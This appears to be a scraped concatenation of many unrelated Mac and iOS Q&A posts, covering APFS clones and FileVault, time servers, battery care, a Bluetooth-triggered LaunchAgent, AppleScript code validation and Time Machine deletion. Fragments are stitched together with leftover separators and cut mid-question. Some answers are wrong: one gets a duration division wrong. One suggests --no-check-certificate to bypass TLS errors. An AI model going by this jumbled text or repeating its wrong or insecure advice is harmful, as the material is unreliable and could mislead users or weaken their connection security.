If your source volume is formatted APFS, CCC v4 will not be able to create (or update) a recovery volume on the destination. CCC v5 adds support for APFS recovery volumes.\n\nAccording to other CCC documentation, spinning platter target disks should be formatted as HFS+:\n\nStarting in macOS High Sierra, both APFS and Mac OS Extended (Journaled) are acceptable formats for a backup of macOS 10.13. Mirroring Apple's recommendations, we recommend that you choose APFS if your destination device is a Flash storage-based device (e.g. an SSD) and will be used to back up 10.13 or higher. Choose Mac OS Extended (Journaled) if your destination device is a spinning-platter-based device (i.e. a hard disk drive, or HDD), or if you are backing up an operating system older than 10.13.\n\nAnyone who's upgraded to High Sierra with an SSD internal disk knows that your startup disk was automatically updated from HFS+ to AFPS as part of that upgrade.\nA Recovery HD on an external clone might not seem like that big of a deal: you could use a bootable USB thumb drive, or maybe Internet Recovery, if needed. However, FileVault requires a Recovery HD in order to encrypt the volume, according to Apple's support documentation:\n\nWithout a Recovery System, FileVault won't encrypt your startup drive.\n  https://support.apple.com/en-us/HT204837\nYou don't need a recovery system to install and use macOS, but without it you can't use FileVault, set up a firmware password, or use Disk Utility to repair the disk. \n  https://support.apple.com/en-us/HT201316\n\nThe Question\nGiven all of this, how can I create a bootable, encrypted clone of my APFS High Sierra source drive using Carbon Copy Cloner 4 (CCC4) and using external HFS+ disks?\n\nA: Here's what worked\n\n\n*\n\n*Download the High Sierra installer from the App Store.\n\n*Run the installer, choosing the external clone disk as the target. This will automatically create a new Recovery HD partition associated with the target disk.\n\n*Reboot from the external disk. Hold down option key during startup to select the boot disk.\n\n*Enable FileVault encryption as usual from the Security & Privacy panel in System Preferences.\n\n\nAdditional Notes\n\n\n*\n\n*You can reboot from your internal drive for better performance, after enabling FileVault on the external. The encryption task will continue as long as you're plugged into power and the external disk is connected.\n\n*It may take several hours, or even days, before encryption is done, depending on the volume of data to be encrypted.\n\n*You can view encryption task progress using the Terminal command diskutil cs list\nWhat didn't work\nThere are some articles posted about how to clone the internal disk Recovery HD volume to any other drive, but I didn't have success with them:\n$ diskutil list\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *500.3 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                 Apple_APFS Container disk1         499.4 GB   disk0s2\n\n/dev/disk1 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +499.4 GB   disk1\n                                 Physical Store disk0s2\n   1:                APFS Volume Mac-HD                  431.9 GB   disk1s1\n   2:                APFS Volume Preboot                 22.9 MB    disk1s2\n   3:                APFS Volume Recovery                518.8 MB   disk1s3\n   4:                APFS Volume VM                      2.1 GB     disk1s4\n\n$ sudo hdiutil create ~/Desktop/Recovery_HD.dmg -srcdevice /dev/disk1s3\nhdiutil: create failed - No such file or directory\n\nI didn't find any articles that specifically addressed the case where the source disk is APFS format.\n\nA: Note that the solution offered mostly only works with macOS 10.13 High Sierra. Though it may be possible to clone an APFS macOS 10.14 Mojave boot drive to HFS+, it is trickier and does not work in all cases.

I want to calculate what this is as a percentage of 9h. I am trying to output 17%.\nI tried diving the cell A1 by 9, but this (rightfully) outputs a duration as A1 is being divided by a number. I need to divide A1 by another duration (i.e. 9h) in order to get a fraction. Is it possible to do this directly in the formula? The only other way I can how to do it is by inputing a duration of 9h into cell B2, and then writing =A1/B2. However, I would prefer being able to avoid using the auxiliary cell B2 when performing this calculation.\n\nA: Divide by text in quotes.\nSo if you want to divide A1 which contain \"1h 30m\" by \"9m\" then use the following function A1 ÷ \"9m\" (A1 contains \"1h 30m\"). This is the equivalent of putting \"9m\" in B1 and then in using the function \"A1 ÷ B1\" in C3: Both will give you 10 because 9 minutes goes into 1 hour 3 min 10 times.\n\n", "Q: Changing time servers in High Sierra man timed and \"hoakley\" says that timed still uses /etc/ntp.conf and I see nothing in the launchd plist that selects that or anything else, so I would think that it is either hard-coded or in some alternate configuration file.\nAnyway, in 10.13.6, changing it has no effect on what the pref pane says is being used.  And the pref pane only allows one of three Apple servers.  Changing that has no effect on ntp.conf  Erasing it causes the USA server to be re-entered (without affecting the file).\nSo, is it possible to point it to a different time server?  If so, how?\n\nA: In OS 10.13.6, I was able to replace time.apple.com. with pool.ntp.org. in the \"Set date and time automatically\" field of the \"Date & Time\" pref pane of System Preferences by highlighting it and typing over it--after authenticating to unlock it, of course. I verified the change in Terminal.app using cat /etc/ntp.conf, which returned server pool.ntp.org..\n\nEDIT: Response to OP’s comment below\n\nIn my case, the name of the server listed in /etc/ntp.conf does change immediately upon selecting a different pre-set server in the \"Date & Time\" preference pane (that is, as long as the \"Set date and time automatically\" checkbox is ticked).\nOut of curiosity, I used sudo nano /etc/ntp.conf to directly edit the name of the server in the network time server configuration file. Although the name of the server in the preference pane remained unchanged, that was the case only until the next activation of timed, when the name of the server I had entered indeed appeared in the preference pane’s text entry field. (I believe timed runs once an hour or upon the system waking from more than an hour’s sleep.) This same sequence of a new server’s name remaining undisclosed by System Preferences until the time daemon runs occurred when I set the network time server using sudo systemsetup -setnetworktimeserver foo.time.foo. \n(And, yes, I really am on High Sierra.)\n", "Q: Save iPhone backup offline Is it possible to download an iCloud backup of my iPhone to save offline? I want to achieve this without the use of iTunes syncing.\nEDIT: I would like to download the backup onto my Mac and then perhaps save it on Google Drive. Let me describe my use case. My iPhone 5 does not have a lot of disk space. I used to use Garage Band on it, but I don't any more, and I'd like to delete it from my phone without losing its data, in case I want to access the music I made someday in the future.\n\nA: A couple years ago I used a paid software called iPhone Backup Extractor, to download a copy of your backups or other iCloud synced data. iTunes was not required in any of the steps.

I recently got the new MacBook Pro 2018 and would like to look after the battery better as I need it for university and would keep it for at least 3 years.\nI understand that they are lithium-ion batteries and have a recommended max cycle counts of 1,000. A cycle count is counted as charging it x%, discharging x% and charging x% (if I remember).\nIf I were to keep the MacBook Pro on permanent charge, I will not have any extra cycle counts. However, would this cause any damage to the computer or not? I also think I read somewhere (a few years ago) about batteries breaking in (just like an engine). If this does happen, how long would this take?\nIf it helps, I have the 15\".\n\nA: These days, keeping your laptop plugged in as much as you like isn't going to make a significant difference to the battery life. The Li-ion batteries in modern MacBooks don't need calibrating, they don't suffer from the \"memory\" problems that NiCd batteries did, and when they hit full charge, they just allow the battery to drain by a couple of percent before trickle charging back up to 100% again.\nApple's most recent battery health tips can be found here: https://www.apple.com/batteries/maximizing-performance/\n", "Q: Mac terminal says \"-bash: echo: write error: Broken pipe\" on opening I opened my terminal, like I do most days Mon-Fri, and was surprised to see this error:\nLast login: Fri Jul 27 17:19:25 on console\n-bash: echo: write error: Broken pipe\nSomeMac:~ user568458$ \n\nEverything seems to work fine currently, but things like this worry me because they could be a clue that something is wrong which might blow up later.\nDoing some searches suggests that this message can appear if someone introduces an error into .bash_profile - but I haven't modified that file in a long time and haven't installed anything that would modify it recently. In fact, my .bash_profile file reports its \"Modified\" date as February (5 months ago).\nHow can I investigate what caused this or how serious it is? Or is it something that can be safely ignored?\n\nIn case it's relevant, since that other linked Q&A mentions .bash_profile commands related to NVM (which I do use), here's the contents of my .bash_profile file:\nexport NVM_DIR=\"$HOME/.nvm\"\n[ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # This loads nvm\n[ -s \"$NVM_DIR/bash_completion\" ] && \\. \"$NVM_DIR/bash_completion\"  # This loads nvm bash_completion\n\nBut this doesn't include the infinite-loop causing line source ~/.bash_profile in that other guy's answer, and these have (as far as I can) not changed since February, so I'm not sure how they could be the cause of the error.\n\nA: A shell's error message is really straight forward. The structure consists of the command, the filename, and the error message.\ncommand: filename: message\n\nYour error message is a bit more complicated in the fact that you are using  a shell builtin command and the filename is a stream through a pipe.

From what I understand, owning and bundling your app on an Apple Device is a required phase of the app creation process on x-code.\nI'm wondering if an iPod Touch 5th generation is a good enough device for running and running my bundled app.\nAppart from the screen size difference (the iPod touch 5th generation is 4\") and minor differences, is an iPod Touch 5th gen an adequate device for ios development or must it obligatorily be an iphone? \nPS: the only similar question I found dated from 2011, just want to be sure it's sill ok in 2018 before buying an iPod Touch and the apple developer licence.\n   Will an iPod touch suffice for testing iOS apps?\nPSS: I'm using react-native (without expo) but I guess it's not relevant in the question.\n\nA: No, an iPod 5th gen would not work for testing your app for these reasons:\n\n\n*\n\n*Software incapabilities. The 5th generation iPod came out in 2012 and is using a 32 bit architecture, therefore, it is unable to update to software requiring a 64 bit architecture. Which means it is stuck at iOS 9.\n\n\nWhy this matters:\niOS 10-11 brought many new features and speed improvements to all apple devices. If you are testing your product on a device that does not have these enhancements, you will not be able to provide a quality product to people using the newer versions of iOS\n\n\n\n*Processor problems. The iPod 5th gen came with Apple's A5 chip and a 32bit chip\n\n\nWhy this matters:\nPlain and simple, your iPod will crash when it runs the app.\n\nA: If you define 'adequate' as meaning you can use it then the answer is yes. You can develop and deploy to the App Store with only testing on 32-bit devices as long you use the latest version of Xcode and include both 32-bit and 64-bit versions.  Many people have deployed to the App Store without having any device to test their app.  \nWhen you archive your app thru Xcode, be sure to use the Generic iOS Device scheme.  You can't archive your app when it's pointing to the simulator.  Apple has good documentation about how to prepare your app for the App Store.\nAs of iOS 11, Apple dropped support for only 32-bit apps but you can include them for backward compatibility.\nYou will be taking a risk that your app will not function correctly, or crash, on a real device with this approach.  This might not be a big deal for you because it's your first app.  Most indie developers use their first app as a test to figure out how to build and deploy on the App Store. \nIf the app crashes during the App Store review process, your app will be rejected.  If users experience app crashes or other unexplained errors, they can leave negative reviews.  If your goal is to create more apps for the App Store, and even sell them, you'll want to invest in an iPhone (at least) and do proper testing.\n", "Q: Can i charge mag safe 1 laptop via external portable battery ? Ive got a mid 2012 15\" Macbook Pro with which has a magsafe 1 power port. \nIs it possible to charge this model of laptop with an external battery like the 20000 Mah units you can get to charge phones / tablets ? But with a magsafe adaptor on it ? \n\nA: The short answer is yes.\nYou just have to make sure that the battery is putting out between 12 and 18 volts.  Be aware, though that the 20000 mAH is only 2AH (2 amp hours or provide 2 amperes in one hour).  At that rate, you'll only get 36 watts (assuming 18V). \nWill it charge?   Yes.

I've got a (current other than this latest update - edit macOS High Sierra 10.13.6 Update) OS X which has stopped updating.  It lists the update, goes through the install, says to reboot.  However, after rebooting the same update is in the list.  Looking at the history it has \"installed\" probably a dozen times now...  Obviously it's not working, but whatever is failing is happening silently.  No error messages.  Looking for debugging suggestions if not outright solutions such as \"yeah that latest update is just bad\".  :-)\n\nA: Try the combo updater instead - https://support.apple.com/kb/DL1970 for a direct download link which you run like any app.\nYou can always Google for \"10.x.y combo update\" & it will be the top hit.\nIt will apply all updates since 10.x.0 without needing any intermediate updates & is often used to fix odd update glitches.\nFailing that, then try reinstalling the OS from Recovery.\nThis will not affect existing apps, docs etc - though of course, as with any operation like this having a current backup is always wise.\n\nA: Search for the official 10.13.6 combo update .\nThis will most probably work because your problem is coming from a previous corrupted download which is in your updates download cache and isn't verified before run. Since this combo update was probably not yet downloaded, it will be clean.\nTo improve your chances to avoid the same problem, avoid to make system downloads when you are connected through Wi-Fi within an area where it might get shut down for any usual reason.\n\nA: Downloaded the .DMG and installed in safe mode (hold down shift key during boot until login appears).  Never could determine why it was failing in normal mode.\n", "Q: How can I trigger an Applecript or Automator app when a specific bluetooth device comes into range? I have an Applescript that connects a bluetooth speaker to my Mac and switches “Play sound effects through:” to “Internal Speakers”.\nI want this script to run every time I turn on my bluetooth speaker. I am currently triggering the script manually with a keyboard shortcut every time I switch the speaker on, but it would be even more convenient if I could set the script to run automatically whenever the bluetooth speaker becomes available to the Mac, preferably without using third-party software.\nIs there a way to do this?\n\nA: This is a sort of tricky thing to do if you don't want to use 3rd party software. However, with some bash and plist scripting we can get it to work!\nFirst, in your ~/Library/LaunchAgents folder create the following .plist file (in this case I have named it com.my.bluetoothdetector.plist; if you change the name, make sure to change line 4 in the file as well):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n        <string>com.my.bluetoothdetector</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/sh</string>\n        <string>/Users/YOURUSERNAME/Desktop/script.sh</string>\n    </array>\n        <key>WatchPaths</key>\n    <array>\n        <string>/Library/Preferences/com.apple.Bluetooth.plist</string>\n    </array>\n</dict>\n</plist>\n\nThe above file will call whatever script is located at /Users/YOURUSERNAME/Desktop/script.sh when there is a change in the Bluetooth environment. You can of course change the location of the file called from the Desktop to wherever you want (ensuring that it is a full path).\nNow, we will make a bash script, which, when triggered by our com.my.bluetoothdetector.plist file, will check whether your device is connected. In this case, we will save this file to /Users/USERNAME/Desktop/script.sh:\n#!/bin/bash\n\nconnectedyesorno=\"$(system_profiler SPBluetoothDataType | awk '/BLUETOOTHDEVICENAME/{f=1}/Connected:/ && f{print $2; exit}')\"\n\nif [ \"$connectedyesorno\" == \"Yes\" ]\nthen\n  open /Applications/YOURAPPNAME.app\nelif [ \"$connectedyesorno\" == \"No\" ]\nthen\n  echo \"Not connected...\"\nelse\n  echo \"ERROR\"\nfi\n\nHere, substitute BLUETOOTHDEVICENAME for the name of your device and the /Applications/YOURAPPNAME.app part of the open /Applications/YOURAPPNAME.app command for the location of the Automator/AppleScript app you want to run. You could also replace this line entirely to run any shell script you want when the device is connected which may negate the need for you to have a separate AppleScript/Automator app to be called.\nFinally, use the command:\nlaunchctl load ~/Library/LaunchAgents/com.my.bluetoothdetector.plist\n\nThis will start up the process which will check for the change in the Bluetooth environment and then call the script.bash when this is detected. \nNow, hopefully, when you connect the Bluetooth device to your computer, after just a few seconds, your AppleScript/Automator file should run!\n\nI have an Applescript that connects a bluetooth speaker to my Mac...\n\nPreviously connected bluetooth devices should connect automatically to a Mac when they become available. If this isn't the case for you, maybe there is some sort of problem to do with your bluetooth settings. Have a look at this article if the problem persists.\nP.S. In the future, if you want to delete this, run the following commands:\nlaunchctl unload ~/Library/LaunchAgents/com.my.bluetoothdetector.plist\nrm -r ~/Library/LaunchAgents/com.my.bluetoothdetector.plist\nrm -r ~/Desktop/script.sh\n\n", "Q: Creating an Automator app I would like to have a clickable app that will open a terminal window, run the script:\ndefaults write com.apple.finder AppleShowAllFiles YES\n\nand then close the terminal app. (and another to turn off the show all, same script with No at end).

In rare cases, your battery might be losing a small amount of power slowly when the machine is under max load. In most case, it will be just fine.\nNote: The LG UltraFine 5K is made for MacBook Pro 15\" and MacBook Pro 13\", and you can see that MacBook Pro 15\" has the best feature support. So it is safe to assume that everything, including the power delivery over USB-C, is highly optimised.\n\nA: All MacBook products will request power and then apply the power they receive to match what's delivered. \nIn practice, you can run at a deficit for minutes or hours and still catch up on charge once the power draw is lower than the supplied.\nLong term, over driving a 29W charger with a 87W load will shorten the service life of the fully run charger, but I've not ever seen this happen in practice. Also, in practice the 61 watt charger from Apple generally keeps up with any and all 15 inch MacBook Pro so much that people prefer to travel with a physically smaller adapter and don’t miss the 25 or so extra watts. \nAlso - I've not had the LG cinema displays skimp at all at powering an aggressively run MacBook Pro previous generation with far too many power hungry accessories connected like Thunderbolt 3 and Thunderbolt 3 to Thunderbolt 2 adapters powering multiple spinning hard drives, USB powered scanners and more.\nThe power supplies in these displays wouldn't make me think a moment to run them with the newest loaded computer based on my experience with them so far. Especially ao over a < 3% over power situation you quote from general specifications.\n", "Q: How to stop screensaver with a keyboard button press, rather than a mouse button press When then screensaver is activated, pressing a button on the keyboard does not stop the show and display the lockscreen.

I fell asleep on the train and missed my stop. So next time I was smart and thought that I would set an alarm. Then I went to sleep with the alarm set for 6:09 instead of 8:09. So I missed the train stop yet again. Let me reiterate: smart. \nInstead of dealing with setting an alarm for a different time every time I get on the train and then either waking up early (because the train, as we know, is always late), forgetting to set it, or setting it for the wrong time.\n\nI am looking for a location based alarm app. I know that location based reminders in the Reminder app already exist but they only show up on your screen and don't make any sound when silent is on.\nI need an app that will be similar to the default Clock app alarms that will sound even if the phone is on silent. Additionally, I would like to ring until I press stop, ensuring that I am awake.\n\nA: You might want to look into both OmniBuzz and SleepyMe; they're both free IOS app which seems to provide the functionality you want. I've not personally used either before but I have a friend who gets the train to work at a ridiculous hour every day and raves about OmniBuzz.\nFrom what others have said about SleepyMe; it seems that the app currently only supports audible alarms (i.e. no option for vibration only) which may be a concern if you don't want to irritate other passengers.\nLet's hope you never miss your stop again!\nBest wishes, Tom\n\nA: There is a very easy solution to this. Set reminders and use location based alert. Set location when you arrive at home. Set time of alert to 6 am or whenever you want. Choose repeat everyday and in principle it should work.

However, putting it back into my iMac resulted in the ominous message I was previously getting (\" no bootable device, press any key\") .. but how do I press keys when my USB ports decided to stop working the moment this message started showing up (at the end of a massive wipe and reinstall, including wiping bootcamp as far as I recall)?

Any clue on how to pair these bad boys \nright at boot?\nWhat's my next move guys? I'm at a loss and I'm sitting on a very expensive brick in a country with no Apple Stores, tearing my hair out.\n\nA: Since you've ruled the HDD out, the remaining options are pretty much the hard drive cable or the logic board. As none of the USB ports work, it sounds like a logic board issue. A way to test would be to reset the PRAM. To do this, plug in a USB keyboard, then before powering on the machine, hold then Cmd, Option, P, R keys all at the same time,hen reach back and power on the machine while holding the keys. Continue to hold the keys.\nIf the logic board is working, the machine will power on, you may see a white screen, then it should reboot and chime again. Keep holding to see if you can get it to chime multiple times before releasing the keys. \nIf that works, then the USB ports are working, and you'd be looking at an issue with the HD cable. Otherwise, unfortunately, it's most likely the logic board, but again, that would require a trip to an Apple Store or AASP (Apple Authorized Service Provider).\n\nA: i have this imac too . you can buy wire keyboard or if you plug the wireless dungle to the nearest USB port to Headphone port ( 1st port from left on the back side ) and when you hearing the ring of power on you insert the keys ( not before power on ) it's work .\n\nA: i have this imac too . you can buy wire keyboard or if you plug the wireless dungle to the nearest USB port to Headphone port ( 1st port from left on the back side ) and when you hearing the ring of power on you insert the keys ( not before power on ) it's work .  you should when hearing the tone rapidly insert up and down ALT keys LEFT and Right DUDe !!!\n", "Q: What is the equivalent of the 'gsettings' command on OS X?

However, when trying to log in, I need to authorize the computer, but when trying to sign in it gives me an error saying This action could not be completed. Try again. If I choose not to authorize the computer, it threatens to delete literally all of the apps on my device.\nIs there another, better way to install an app on my iPhone?\n\nA: Depending on your setup, you have two options.\n\n\n*\n\n*OPTION 1 - Use iTunes 12.6.3 instead. Refer to this answer for more details!\n\n*OPTION 2 - Use Apple Configurator 2. Download and install Apple Configurator.\n\n\nSince you're saying that iTunes 12.6.3 isn't working for you, than give Apple Configurator 2 a go. Apple Configurator 2 provides much more advanced features in terms of managing your iOS devices. \n\nA: iMazing, which is a third-party app for iOS device management, can install apps to your device:\nHere's a link to an article with more details.\n\nA: If the app is an App Store app you can just go to the app store directly and get the app. Find the app you want and click get.\n", "Q: upgrade iphone 4 to latest iOS as 9 or 10 Is it possible to upgrade iPhone 4 iOS to 9 or 10 using jail break approach?\nMain purpose to install apps which require latest iOS.

I usually run it from the terminal by typing atom. I moved many of my apps to an external drive to free up disk space. I originally moved Atom but have since moved it back onto my startup volume. \nSometime during all this I have messed up something and now Atom no longer runs from the command line. I started Atom by double-clicking on the icon. I selected \"Install shell command\" from the  Atom menu. \nPreviously I did that so I could run atom from the command line. Well, it didn't work this time. How can I tell what that menu option actually does? When I select \"Install shell command\", what does Atom actually do?

Most questions I've read that pertain to this offer alternative ways to run Atom from the command line. I know how to do that, I'm trying to get things back to the way it was before my messing around caused all of this.\n\nA: Looks to me as though it's running \n/Applications/Atom.app/Contents/Resources/app/atom.sh \nbut you should be able to edit your ~/.bash_config and add the line \nalias atom=\"/Applications/Atom.app/Contents/MacOS/Atom\" \nthen re-open terminal and you'll be able to launch atom by typing atom [filename], assuming your copy of Atom is installed in the /Applications folder\n", "Q: Arabic Font iOS 11 Ever since I switched to an iOS device from Android, I have noticed that the Arabic font looks like this: \nThis font is very different from the classic Arabic font and is very annoying to read.

You can see which are currently bound to keys by typing bindkey command in zsh.\nYou can also write shell functions and then declare those as widgets which can then be key bound. Here is a guide to zle.\nThe slight complication is that Iterm2 will not, by default, pass alt or Cmd modified strokes through to the shell. \nThis can be configured in iTerm2 → Preferences → Profiles → keys.\nAn alt+ key  is equivalent to esc followed by key, hence to pass this to the sh you add a key bind to:\nAction: Send escape sequence \nEsc+: key\n", "Q: iPhone turns off display whenever covering the proximity sensor I have an iPhone 7.

The default answer of the dialog is \"Enter Code\". The required input is a 6-digit code given to each user. On receiving the user's input (or code), some validation checks need to occur confirming that the user's input is acceptable based on the following conditions:\n\n\n*\n\n*User can't enter letters or symbols.\n\n*Input must be in an integer (whole numbers only, and yes zero counts). \n\n*The code (input), just be exactly (or equal to) 6 digits long. No more or no less than 6.\nBackground - the user's code is generated ad-hoc from another application and is unique each time. There is no way to cross reference this code. \n\nFor example, the user enters 123456 into the dialog box. Using Apple Script, how can I script this, ensuring again, that the code is all numbers, and precisely 6 digits long?\n\nA: Solution 1:\nset input to \"123456\"\n\nif the length of the input ≠ 6 ¬\n    then return \"Wrong number of characters.\"\n\ntry\n    if \"0123456789\" does not contain item 1 of the input ¬\n        or item -1 of the input is in [space, tab, linefeed] ¬\n        then error\n    \n    set input to input as number\n    \n    if class of the input ≠ integer then error\non error\n    return \"Invalid characters.\"\nend try\n\n\n\ntext -6 thru -1 of (\"000000\" & the input)\n\n\nSolution 2:\nThis solution benefits from being extremely short, but also treats the problem as it ought to be treated.  It's a misnomer to say you wish to \"validate user input as integer\", when, in fact, we are only ever dealing with text.  The passcode is a 6-character passcode, and those characters are limited to the unicode values that represent digits; but they are still text characters, and not integers in any numerical sense.\nMark's comment against the question actually stated this, but even I fell into the mindset of wanting to assess the input as numbers, which is partly what Solution 1 above does; and it works, and it is a perfectly good solution, but it performs needless steps to get to the end result.\nTreating the input purely as text, the problem, so succinctly stated by Mark is to \"Check the string is 6 characters and each of those is in range 0-9.\"  So that's exactly what this solution does, in one simple line:\nset input to \"123456\"\n\nset validation to do shell script ¬\n    \"egrep -x '[0-9]{6}' <<<\" & ¬\n    quoted form of the input & ¬\n    \"|| echo Invalid input\"\n\nThe variable validation will either contain the 6-digit code if it is valid, or \"Invalid input\" otherwise.\n\nA: display dialog \"Enter Your Code\" default answer \"\" with hidden answer # Ask for user input as dots instead of text\nset myCode to the text returned of the result as string # set myCode to what the user enters\nset isNum to true # define isNum as true unless changed\ntry\n    set bla to myCode as number # will fail if myCode is not a number\non error\n    set isNum to false # failed\nend try\nset prohibitedChars to {\".\", \" \", \"+\", \"-\"}\nset myItems to every item of myCode\nset containsGoodChars to true\nrepeat with i in myItems\n    if i is in prohibitedChars then\n        set containsGoodChars to false\n    end if\nend repeat\nif ((length of myCode is 6) and (isNum) and (containsGoodChars)) then # if myCode is 6 characters long and it is a number then\n\n    --do some code\n\nelse # validation failed\n    display dialog \"You failed.

For example, if your HOME directory is not world-readable, none of your files are in the database.\n\nWhen performing a casual command-line search on a Mac, the usual procedure is to use locate for system-owned files and the GUI process \"Spotlight.app\" for your files. (Spotlight is perfectlY capable of performing complex searches as well, and it's fast.)

Either your store was damaged in some way, or the certificate in question is not valid anymore, and you receive this error as the connection can't be guaranteed. From testing, their certificate is still valid, so there are likely some issues with your ssl store.\nYou can also add this option --no-check-certificate to ignore such errors, which would solve your problems.

First, I logged out of iCloud and logged into my Apple ID instead. Then, I switched iMessage, FaceTime, Game Center, and a few other things. The problem is, my computer is still showing remnants of the old Apple ID. Is there a way to completely switch Apple IDs with one login on an iMac? Or do I just have to switch everything as I go along?\n(Edit:) It would be too inconvenient to create a new user account because I have a lot of settings to applications adjusted and my computer too rigged up. \n\nA: Apple does have several places for id - I have for historic reasons 2 different ids and so note some of the differences.\nThere are actually separate places that have logins.\n\n\n*\n\n*iCloud/Mail login\n\n*iTunes login for music/vides etc\n\n*iPad/iPhone app store\n\n*MacOS store\n\n*Apple developer (I have several different ids here)\n\n\nI have one id for 1 and another for the rest and others for 5.

I suppose you could jailbreak the device if you had to purge things.\nI totally get the annoyance - it’s your data and your device, so it’s frustrating to not be able to control it, especially since cookies and local store is a privacy issue persisting data when an app is removed.\nThe only practical solution short of a jailbreak into third party app sandboxes is to use apps that store items in an iCloud synced keychain so a Mac can clean and observe.\n\nA: Have you tried this link?

I know this command gives you the serial number for a Mac:\n$ ioreg -l | grep IOPlatformSerialNumber\n\nWhere does this command get the serial number from? From the storage or from the firmware (this last more likely I guess)?  Any way to get the serial number from the startup disk, so that you can get the serial number for a machine in target disk mode or connected to an enclosure?\n\nA: Serial numbers are stored within the logic board firmware. \nAs a result, if you're trying to access a Mac in Target Disk Mode you're not going to get it's serial number from the Startup Disk (well, not unless someone has previously recorded the serial number on a file stored somewhere on the disk).\nIf you need the serial number and you can't boot into the Mac, there may be other ways to obtain it (e.g. Apple sometimes engraves serial numbers on the device, by contacting Apple, etc).\n\nA: Most Apple products have their serial numbers printed somewhere on the outside: https://support.apple.com/en-us/HT202888 \nMacbook Pro has it printed on the bottom.  Of course, the bottom is removable, so it might not match the firmware's number.

I am able to skip the slideshow, but I am having other problems that I think might be more resolvable if I knew what the slideshow was supposed to mean. Any help would be appreciated.\n\n\n\nA: I'm pretty sure these images are intended to remind you that the computer is trying to connect to a couple of Bluetooth devices, the second of which appears to show the underside of a Magic Mouse. You should be able to remedy this by performing the NVram reset upon restarting, except that when the screen lights at the last startup cycle, you'll have to immediately press and hold \"Option\" to select your USB drive to boot from again. You may also have to initiate Safe Boot Mode before the NVram reset. These procedures may take a while, especially when booting from a USB drive.\n", "Q: MacBook Pro 2011 having problems with sleeping and screen brightness after removing GPU drivers (it had failed)? My MacBook Pro 2011 GPU has failed earlier last week, I had to remove the GPU drivers to get it to work again.\nAfter doing so, \nit either doesn't sleep at all (when closing the lid), \nor it goes to sleep when you choose Sleep from the Apple menu but never wakes up. \nIt also has an issue with overheating and screen brightness. \nI'm wondering if there is any solutions to any of these problems. \n\nA: The first thing I would try is resetting the System Management Controller (SMS).\nHow to reset the SMC on your model of MacBook Pro\n\n\n*\n\n*Shut down your MBP\n\n*Unplug the power cable from your MBP\n\n*For 10 seconds, press and hold at the same time the shiftcontroloption keys (on the left side of the built-in keyboard) and the power button\n\n*After 10 seconds let go of all keys and the power button \n\n*Plug in the power cable\n\n*Switch your MBP back on \n\n\nA: The root problem is quite common on that model and just removing the dGPU drivers for the Radeon chip one way to get it \"to work\" again.\nBut that leaves you with a machine that still uses the AMD chip for display, just without the proper drivers for accelerated display and no proper thermal management for the dGPU.\nFor a better fix in software you might want to try this solution here:\nGPU problem - Boot Hangs on Grey Screen.  That will give you accelerated display using the Intel graphics chip and a certain amount of thermal management back.\nThe full set of drivers is necessary to use the machine and get thermal management. The fix described in the link does work with High Sierra, but the drawbacks on that system are more numerous than with Sierra.\nOne problem with this solution is that on High Sierra the keys for display brightness will probably not work correctly. (Compared to Sierra Apple changed how that works/how that depends on GPU status or proper drivers…?)\nTo work around that, use macOS Sierra, that will also give you an overall much better experience in this situation. Alternatively, staying on High Sierra you might resort to using a software solution like Brightness Slider (free, AppStore-link) or a similar software. With Brightness-Slider you may even set up separate hotkey combinations for brightness control.\nThe sleep issue also gets worse with High Sierra. With the above \"solution\" linked to this should work well for a time, unless you connect too much peripherals (primarily to the ThunderBolt port) and it gets progressively worse, if you let the system go to sleep with these peripherals connected. With Sierra, Lid-Close-Sleep can be restored by re-setting NVRAM/SMC once the problem pops up. For both versions of macOS a more convenient solution is to avoid system sleep via lid-close. This is triggered via SMC and in the above configuration the data in SMC/NVRAM will eventually prevent proper wake.\nTo work around that, avoid lid-sleep and always issue it via keyboard shortcut or the menu item.\nBottom line: if it is in any way feasible at all for you, try to stay on macOS Sierra 10.12 for this problematic machine and use the general fix provided at the link.\n", "Q: Time Capsule/Time Machine volume slow to process with tmutil My 2TB Time Capsule has functioned as our home router and backup device for years. \nIt's not very fast at backing up over network, but since this is a passive activity it's never been a problem.\nI went into the volume to try to clean it up a bit and it's really slow to respond over both GUI and command line.\n\n\n*\n\n*I'm within close wireless range (5 meters, direct line of sight)\n\n*Pinged packets return in < 1ms, I don't think it's the wifi\n\n*Browsing the network disk in Finder is very slow, it takes 20+ seconds just for folders and files on the disk to populate\n\n*tmutil responds just as, if not more slowly (as does simply running ls in the Time Machine volume)\n\n*Most importantly, trying to delete items via tmutil is way too slow. Usually taking over 45 minutes to delete a 500MB backup.\n(I realize that these backups are stored as diffs rather than complete files, so there's some degree of logic that is going into the deletion process, but this still seems absurd)\n\nI looped through my backups and wanted to delete most of them, like so:\nsudo tmutil delete /Volumes/Time\\ Machine\\ Backups/Backups.backupdb/foo/2016-08-10-015922\nI have 130 backups I want to remove this device and even at an optimistic 30 minutes per deletion, that's still 65 continuous hours of this script running (for something that should take less than an hour IMO).\nWhat's wrong?\n\nBase Station/Time Capsule OS version: 7.6.9 [11] (latest)\n\nA: I don’t think anything is wrong. The hard link directory nature of a time machine backup is extraordinarily iops constrained and coupled with the limited power of the disk controller in AirPort, you’re far better off copying off the files you want to keep and then erasing the volume. \nEach backup has a directory entry for each and every file present on the source so each backup interval deletion is actually a ton of work (whereby a ton is defined as 250,000 directory entries with ACL, permissions, date metadata, etc...)\nYour network measures are spot on, and I worry your TimeCapsule drive could be failing if a simple ls is lagging so badly. \n", "Q: Single-User-Recovery-Mode on High Sierra 10.13.6 Before the High Sierra update to 10.13.6 I was able to boot in single-user-recovery mode by holding Cmd-R-S at startup, but after the latest software update booting while holding Cmd-R-S just enters the regular Single-User Mode on the root volume (like if I pressed only Cmd-S).\nIs there a new method or alternative key combination to boot the RecoveryOS in Single-User Mode?\nEDIT: booting while holding Cmd-Option-R-S also starts in Single-user mode (not Single-user-recovery mode).\n\nA: I was having the same issue, this is how I fixed 